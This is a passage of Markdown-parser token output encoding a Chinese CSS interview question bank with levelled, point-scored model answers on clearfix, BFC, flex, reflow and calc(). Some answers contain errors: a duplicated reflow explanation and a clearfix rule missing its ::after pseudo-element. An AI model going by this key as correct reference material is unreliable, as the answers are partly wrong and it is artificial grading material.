margin；","tokens":[{"type":"text","raw":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","tokens":[{"type":"text","raw":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","text":"需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；","escaped":false}]}]},{"type":"list_item","raw":"+ 需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","task":false,"loose":false,"text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","tokens":[{"type":"text","raw":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","text":"需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. 如何清除浮动?\\n\\n","depth":2,"text":"3. 如何清除浮动?","tokens":[{"type":"text","raw":"3. 如何清除浮动?","text":"3. 如何清除浮动?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：**\\n  .clearfix{\\n    clear:both;\\n    content:\'\';\\n    display:block;\\n    width: 0;\\n    height: 0;\\n    visibility:hidden;\\n  }","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：**\\n  .clearfix{\\n    clear:both;\\n    content:\'\';\\n    display:block;\\n    width: 0;\\n    height: 0;\\n    visibility:hidden;\\n  }","task":false,"loose":false,"text":"**2：**\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","tokens":[{"type":"text","raw":"**2：**\\n\\n.clearfix{\\n\\n  clear:both;\\n\\n  content:\'\';\\n\\n  display:block;\\n\\n  width: 0;\\n\\n  height: 0;\\n\\n  visibility:hidden;\\n\\n}","text":"**2：**\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":"\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","text":"\\n.clearfix{\\n  clear:both;\\n  content:\'\';\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. 使元素消失的方法?\\n\\n","depth":2,"text":"4. 使元素消失的方法?","tokens":[{"type":"text","raw":"4. 使元素消失的方法?","text":"4. 使元素消失的方法?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  + visibility:hidden;\\n  + display:none;\\n  + opacity:0;\\n  + z-index:-1;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  + visibility:hidden;\\n  + display:none;\\n  + opacity:0;\\n  + z-index:-1;","task":false,"loose":false,"text":"**1：**\\n+ visibility:hidden;\\n+ display:none;\\n+ opacity:0;\\n+ z-index:-1;","tokens":[{"type":"text","raw":"**1：**\\n","text":"**1：**","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]}]},{"type":"list","raw":"+ visibility:hidden;\\n+ display:none;\\n+ opacity:0;\\n+ z-index:-1;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ visibility:hidden;\\n","task":false,"loose":false,"text":"visibility:hidden;","tokens":[{"type":"text","raw":"visibility:hidden;","text":"visibility:hidden;","tokens":[{"type":"text","raw":"visibility:hidden;","text":"visibility:hidden;","escaped":false}]}]},{"type":"list_item","raw":"+ display:none;\\n","task":false,"loose":false,"text":"display:none;","tokens":[{"type":"text","raw":"display:none;","text":"display:none;","tokens":[{"type":"text","raw":"display:none;","text":"display:none;","escaped":false}]}]},{"type":"list_item","raw":"+ opacity:0;\\n","task":false,"loose":false,"text":"opacity:0;","tokens":[{"type":"text","raw":"opacity:0;","text":"opacity:0;","tokens":[{"type":"text","raw":"opacity:0;","text":"opacity:0;","escaped":false}]}]},{"type":"list_item","raw":"+ z-index:-1;","task":false,"loose":false,"text":"z-index:-1;","tokens":[{"type":"text","raw":"z-index:-1;","text":"z-index:-1;","tokens":[{"type":"text","raw":"z-index:-1;","text":"z-index:-1;","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. 理解BFC吗？\\n\\n","depth":2,"text":"5. 理解BFC吗？","tokens":[{"type":"text","raw":"5. 理解BFC吗？","text":"5. 理解BFC吗？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  BFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n  具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n  通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  BFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n  具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n  通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","task":false,"loose":false,"text":"**1：**\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","tokens":[{"type":"text","raw":"**1：**\\n\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n\\n具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n\\n通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","text":"**1：**\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。  \\n具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。  \\n通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。","text":"\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。","text":"具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","text":"通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. 解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用\\n\\n","depth":2,"text":"6. 解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用","tokens":[{"type":"text","raw":"6. 解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用","text":"6. 解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：**\\n  flex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：**\\n  flex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","task":false,"loose":false,"text":"**1：**\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","tokens":[{"type":"text","raw":"**1：**\\n\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\n\\ndisplay: flex：将容器设置为弹性容器。\\n\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\n\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\n\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","text":"**1：**\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","text":"\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. 如何减少页面回流和重绘？\\n\\n","depth":2,"text":"7. 如何减少页面回流和重绘？","tokens":[{"type":"text","raw":"7. 如何减少页面回流和重绘？","text":"7. 如何减少页面回流和重绘？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流\\n- **1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流\\n- **1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式\\n- **1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。\\n- **1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流\\n","task":false,"loose":false,"text":"**1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","tokens":[{"type":"text","raw":"**1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","text":"**1：** 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","text":" 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流\\n","task":false,"loose":false,"text":"**1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","tokens":[{"type":"text","raw":"**1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","text":"**1：** 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","text":" 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式\\n","task":false,"loose":false,"text":"**1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","tokens":[{"type":"text","raw":"**1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","text":"**1：** 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","text":" 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。\\n","task":false,"loose":false,"text":"**1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","tokens":[{"type":"text","raw":"**1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","text":"**1：** 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","text":" 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","task":false,"loose":false,"text":"**1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","tokens":[{"type":"text","raw":"**1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","text":"**1：** 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","text":" 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 8. 如何使用 calc() 函数？\\n\\n","depth":2,"text":"8. 如何使用 calc() 函数？","tokens":[{"type":"text","raw":"8. 如何使用 calc() 函数？","text":"8. 如何使用 calc() 函数？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","task":false,"loose":false,"text":"**1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","tokens":[{"type":"text","raw":"**1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","text":"**1：** calc() 允许你在 CSS 中执行简单的数学运算。例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" calc() 允许你在 CSS 中执行简单的数学运算。例如：","text":" calc() 允许你在 CSS 中执行简单的数学运算。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  width: calc(100% - 20px);\\n```","lang":"css","text":"  width: calc(100% - 20px);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 9. CSS 中的三种常用布局方式？\\n\\n","depth":2,"text":"9. CSS 中的三种常用布局方式？","tokens":[{"type":"text","raw":"9. CSS 中的三种常用布局方式？","text":"9. CSS 中的三种常用布局方式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** float 布局：通过浮动和清除浮动来实现布局\\n- **1：** flex 布局：更加现代和灵活，适用于一维布局\\n- **1：** grid 布局：二维布局，支持更复杂的布局","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** float 布局：通过浮动和清除浮动来实现布局\\n","task":false,"loose":false,"text":"**1：** float 布局：通过浮动和清除浮动来实现布局","tokens":[{"type":"text","raw":"**1：** float 布局：通过浮动和清除浮动来实现布局","text":"**1：** float 布局：通过浮动和清除浮动来实现布局","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" float 布局：通过浮动和清除浮动来实现布局","text":" float 布局：通过浮动和清除浮动来实现布局","escaped":false}]}]},{"type":"list_item","raw":"- **1：** flex 